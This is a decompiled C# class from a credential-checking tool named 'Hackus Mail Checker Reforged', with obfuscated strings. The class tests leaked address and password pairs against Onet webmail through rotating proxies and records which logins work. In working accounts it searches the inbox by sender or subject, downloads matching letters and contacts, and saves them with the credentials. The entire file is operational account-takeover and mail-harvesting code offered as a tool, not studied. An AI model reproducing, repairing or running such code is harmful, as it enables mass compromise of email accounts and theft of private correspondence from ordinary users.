using System;
using System.Collections.Generic;
using System.Linq;
using System.Text.RegularExpressions;
using System.Threading;
using Hackus_Mail_Checker_Reforged.Models;
using Hackus_Mail_Checker_Reforged.Models.Enums;
using Hackus_Mail_Checker_Reforged.Net.Mail.Message;
using Hackus_Mail_Checker_Reforged.Net.Web.Onet;
using Hackus_Mail_Checker_Reforged.Services.Managers;
using Hackus_Mail_Checker_Reforged.Services.Settings;
using Newtonsoft.Json;
using xNet;

namespace Hackus_Mail_Checker_Reforged.Net
{
	// Token: 0x020000A8 RID: 168
	public class OnetClientNew
	{
		// Token: 0x17000134 RID: 308
		// (get) Token: 0x0600055F RID: 1375 RVA: 0x00006D62 File Offset: 0x00004F62
		private SearchSettings SearchSettings
		{
			get
			{
				return SearchSettings.Instance;
			}
		}

		// Token: 0x06000560 RID: 1376 RVA: 0x00009B95 File Offset: 0x00007D95
		public OnetClientNew(Mailbox mailbox)
		{
			this._mailbox = mailbox;
		}

		// Token: 0x06000561 RID: 1377 RVA: 0x00020A44 File Offset: 0x0001EC44
		public void Handle()
		{
			if (this._mailbox.Address == null)
			{
				return;
			}
			OperationResult operationResult = this.Login();
			StatisticsManager.Instance.Increment(operationResult);
			FileManager.SaveStatistics(this._mailbox.Address, this._mailbox.Password, operationResult);
			if (operationResult == OperationResult.Ok)
			{
				this.ProcessValid();
				if (!SearchSettings.Instance.Search)
				{
					MailManager.Instance.AddResult(new MailboxResult(this._mailbox));
				}
			}
		}

		// Token: 0x06000562 RID: 1378 RVA: 0x00020AB8 File Offset: 0x0001ECB8
		public OperationResult Login()
		{
			OperationResult operationResult;
			do
			{
				this.Reset();
				operationResult = this.CreateSession();
			}
			while (operationResult == OperationResult.HttpError);
			return operationResult;
		}

		// Token: 0x06000563 RID: 1379 RVA: 0x00020AD8 File Offset: 0x0001ECD8
		private OperationResult CreateSession()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					string text = string.Concat(new string[]
					{
						<Module>.smethod_5<string>(881170888),
						this._mailbox.Password,
						<Module>.smethod_2<string>(-459574644),
						this._mailbox.Address,
						<Module>.smethod_3<string>(-379602189)
					});
					string text2 = httpRequest.Post(<Module>.smethod_3<string>(-1503374757), text, <Module>.smethod_6<string>(-989874009)).ToString();
					if (!text2.Contains(<Module>.smethod_4<string>(1000809029)))
					{
						if (text2.ContainsIgnoreCase(<Module>.smethod_6<string>(2060561188)))
						{
							return OperationResult.Bad;
						}
					}
					else
					{
						Match match = Regex.Match(text2, <Module>.smethod_3<string>(-901078390));
						if (match.Success)
						{
							this._accessToken = match.Groups[1].Value;
							return OperationResult.Ok;
						}
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000564 RID: 1380 RVA: 0x00020C10 File Offset: 0x0001EE10
		public void ProcessValid()
		{
			if (!this.SearchSettings.Search)
			{
				return;
			}
			if (this.GetSearchToken() == OperationResult.Ok)
			{
				OperationResult operationResult = OperationResult.Retry;
				int num = 0;
				bool flag = false;
				List<Request> list = new List<Request>();
				while (operationResult == OperationResult.Retry && num <= 2)
				{
					if (!flag && this.SearchSettings.Search)
					{
						operationResult = this.SearchMessages(list);
						if (operationResult == OperationResult.Ok)
						{
							flag = true;
						}
					}
					else
					{
						operationResult = OperationResult.Ok;
					}
					if (operationResult != OperationResult.Retry)
					{
						if (operationResult == OperationResult.Bad)
						{
							break;
						}
					}
					else if (ProxySettings.Instance.UseProxy)
					{
						this._proxyClient = ProxyManager.Instance.GetProxy();
					}
				}
				foreach (Request request in list)
				{
					int count = request.Count;
					if (count > 0 && (!this.SearchSettings.UseSearchLimit || this.SearchSettings.SearchLimit <= count))
					{
						MailboxResult result = new MailboxResult(this._mailbox, request.ToString(), count);
						MailManager.Instance.AddResult(result);
						StatisticsManager.Instance.IncrementFound();
						FileManager.SaveFound(this._mailbox.Address, this._mailbox.Password, request.ToString(), count);
					}
				}
				return;
			}
		}

		// Token: 0x06000565 RID: 1381 RVA: 0x00020D58 File Offset: 0x0001EF58
		public OperationResult GetSearchToken()
		{
			for (int i = 0; i < 2; i++)
			{
				this.WaitPause();
				try
				{
					using (HttpRequest httpRequest = new HttpRequest())
					{
						this.SetHeaders(httpRequest);
						httpRequest.AllowAutoRedirect = false;
						httpRequest.AddHeader(<Module>.smethod_6<string>(-1684638845), <Module>.smethod_2<string>(1338381994) + this._accessToken);
						string text = <Module>.smethod_2<string>(-8042405);
						string text2 = httpRequest.Post(<Module>.smethod_6<string>(871686576), text, <Module>.smethod_6<string>(-989874009)).ToString();
						if (text2.Contains(<Module>.smethod_4<string>(1000809029)))
						{
							Match match = Regex.Match(text2, <Module>.smethod_3<string>(-901078390));
							if (match.Success)
							{
								this._accessToken = match.Groups[1].Value;
								this._cookies.Add(<Module>.smethod_3<string>(1910280469), this._accessToken);
								this._cookies.Add(<Module>.smethod_5<string>(1567062230), <Module>.smethod_4<string>(269157060));
								return OperationResult.Ok;
							}
						}
						return OperationResult.Error;
					}
				}
				catch (ThreadAbortException)
				{
					throw;
				}
				catch
				{
				}
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000566 RID: 1382 RVA: 0x00020EA8 File Offset: 0x0001F0A8
		private OperationResult DownloadContacts()
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AddHeader(<Module>.smethod_6<string>(-1207114210), <Module>.smethod_3<string>(1258069096));
					httpRequest.AllowAutoRedirect = false;
					foreach (object obj in Regex.Matches(httpRequest.Get(<Module>.smethod_3<string>(-1180094093), null).ToString(), <Module>.smethod_3<string>(1429214351)))
					{
						FileManager.SaveContact(((Match)obj).Groups[1].Value);
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.Retry;
		}

		// Token: 0x06000567 RID: 1383 RVA: 0x00020FA0 File Offset: 0x0001F1A0
		private OperationResult SearchMessages(List<Request> checkedRequests)
		{
			using (IEnumerator<Request> enumerator = this.SearchSettings.Requests.GetEnumerator())
			{
				while (enumerator.MoveNext())
				{
					Request request = enumerator.Current;
					Request request3 = checkedRequests.FirstOrDefault((Request r) => OnetClientNew.<>c__DisplayClass13_0.smethod_0(r.Sender, request.Sender) && OnetClientNew.<>c__DisplayClass13_0.smethod_0(r.Body, request.Body) && OnetClientNew.<>c__DisplayClass13_0.smethod_0(r.Subject, request.Subject));
					if (request3 == null)
					{
						request3 = request.Clone();
						request3.FindedUids = new HashSet<Uid>();
						request3.SavedUids = new HashSet<Uid>();
						checkedRequests.Add(request3);
					}
					else if (request3.IsChecked || (request3.SavedUids != null && request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit))
					{
						continue;
					}
					if (request.Body == null && (request.Sender == null || request.Subject == null))
					{
						Request request2 = request3;
						if (!request2.FindedUids.Any<Uid>())
						{
							OperationResult operationResult = this.Search(request2);
							if (operationResult == OperationResult.Error)
							{
								request2.IsChecked = true;
								continue;
							}
							if (operationResult == OperationResult.HttpError)
							{
								return OperationResult.Retry;
							}
						}
						if (this.SearchSettings.DownloadLetters)
						{
							if (CheckerSettings.Instance.UsePop3Limit && request2.FindedUids.Count > CheckerSettings.Instance.Pop3Limit)
							{
								request3.FindedUids = new HashSet<Uid>(request3.FindedUids.Take(CheckerSettings.Instance.Pop3Limit));
							}
							using (HashSet<Uid>.Enumerator enumerator2 = request3.FindedUids.GetEnumerator())
							{
								while (enumerator2.MoveNext())
								{
									Uid uid = enumerator2.Current;
									if (!request3.SavedUids.Any((Uid u) => u == uid))
									{
										if (request3.SavedUids.Count >= this.SearchSettings.DownloadLettersLimit)
										{
											break;
										}
										MailMessage message;
										OperationResult operationResult2 = this.FetchMessage(uid, out message);
										if (operationResult2 == OperationResult.Error)
										{
											request3.SavedUids.Add(uid);
										}
										else
										{
											if (operationResult2 == OperationResult.HttpError)
											{
												return OperationResult.Retry;
											}
											request3.SavedUids.Add(uid);
											FileManager.SaveWebLetter(this._mailbox.Address, this._mailbox.Password, request3.ToString(), message);
										}
									}
								}
								goto IL_244;
							}
							goto IL_238;
						}
						IL_244:
						request2.IsChecked = true;
						continue;
					}
					IL_238:
					request3.IsChecked = true;
				}
			}
			return OperationResult.Ok;
		}

		// Token: 0x06000568 RID: 1384 RVA: 0x00021248 File Offset: 0x0001F448
		private OperationResult Search(Request searchRequest)
		{
			this.WaitPause();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					httpRequest.AddUrlParam(<Module>.smethod_4<string>(-1314179379), <Module>.smethod_3<string>(-1701570294));
					httpRequest.AddUrlParam(<Module>.smethod_5<string>(390396973), <Module>.smethod_4<string>(2863494));
					httpRequest.AddUrlParam(<Module>.smethod_5<string>(1683099474), 1);
					httpRequest.AddUrlParam(<Module>.smethod_6<string>(1015971440), 1);
					httpRequest.AddUrlParam(<Module>.smethod_4<string>(1436617774), <Module>.smethod_4<string>(1274271205));
					httpRequest.AddUrlParam(<Module>.smethod_5<string>(791758583), 100);
					httpRequest.AddUrlParam(<Module>.smethod_3<string>(978921121), (searchRequest.Sender == null) ? searchRequest.Subject : searchRequest.Sender);
					string text = httpRequest.Get(<Module>.smethod_2<string>(1591351987), null).ToString();
					SearchResponse searchResponse = null;
					try
					{
						searchResponse = JsonConvert.DeserializeObject<SearchResponse>(text);
					}
					catch
					{
					}
					if (((searchResponse != null) ? searchResponse.Mails : null) == null)
					{
						return OperationResult.Ok;
					}
					searchRequest.Count = searchResponse.Total_count;
					foreach (MidsResponse midsResponse in searchResponse.Mails)
					{
						if (searchRequest.Sender == null)
						{
							if (searchRequest.Subject != null && midsResponse.Subject.ContainsIgnoreCase(searchRequest.Subject))
							{
								searchRequest.FindedUids.Add(new Uid(midsResponse.Mid));
							}
						}
						else if (midsResponse.From.ContainsIgnoreCase(searchRequest.Sender))
						{
							searchRequest.FindedUids.Add(new Uid(midsResponse.Mid));
						}
					}
					return OperationResult.Ok;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x06000569 RID: 1385 RVA: 0x000214A4 File Offset: 0x0001F6A4
		private OperationResult FetchMessage(Uid uid, out MailMessage message)
		{
			this.WaitPause();
			message = new MailMessage();
			try
			{
				using (HttpRequest httpRequest = new HttpRequest())
				{
					this.SetHeaders(httpRequest);
					httpRequest.AllowAutoRedirect = false;
					string input = httpRequest.Get(<Module>.smethod_6<string>(449210694) + uid.UID.ToString(), null).ToString();
					Match match = Regex.Match(input, <Module>.smethod_4<string>(-21090364));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.Subject = match.Groups[1].Value;
					match = Regex.Match(input, <Module>.smethod_2<string>(1324786255));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.Date = DateTime.Parse(match.Groups[1].Value);
					match = Regex.Match(input, <Module>.smethod_4<string>(-229771839));
					if (!match.Success)
					{
						return OperationResult.Error;
					}
					message.AlternateViews.Add(new Attachment(<Module>.smethod_3<string>(-1751551436), match.Groups[1].Value));
					match = Regex.Match(input, <Module>.smethod_4<string>(-902324492));
					if (match.Success)
					{
						message.From = match.Groups[1].Value;
						return OperationResult.Ok;
					}
					return OperationResult.Error;
				}
			}
			catch (ThreadAbortException)
			{
				throw;
			}
			catch
			{
			}
			return OperationResult.HttpError;
		}

		// Token: 0x0600056A RID: 1386 RVA: 0x00009BA4 File Offset: 0x00007DA4
		private void Reset()
		{
			this._cookies = new CookieDictionary(false);
			if (ProxySettings.Instance.UseProxy)
			{
				this._proxyClient = ProxyManager.Instance.GetProxy();
			}
		}

		// Token: 0x0600056B RID: 1387 RVA: 0x0002165C File Offset: 0x0001F85C
		private void SetHeaders(HttpRequest request)
		{
			request.IgnoreProtocolErrors = true;
			request.ConnectTimeout = CheckerSettings.Instance.Timeout * 1000;
			request.Cookies = this._cookies;
			request.Proxy = this._proxyClient;
			request.UserAgent = <Module>.smethod_4<string>(-931874150);
			request.AddHeader(<Module>.smethod_6<string>(-2097040384), <Module>.smethod_4<string>(1532696417));
		}

		// Token: 0x0600056C RID: 1388 RVA: 0x00009AC8 File Offset: 0x00007CC8
		private void WaitPause()
		{
			ThreadsManager.Instance.WaitHandle.WaitOne();
		}

		// Token: 0x040002D6 RID: 726
		private Mailbox _mailbox;

		// Token: 0x040002D7 RID: 727
		private ProxyClient _proxyClient;

		// Token: 0x040002D8 RID: 728
		private CookieDictionary _cookies;

		// Token: 0x040002D9 RID: 729
		private string _accessToken;
	}
}
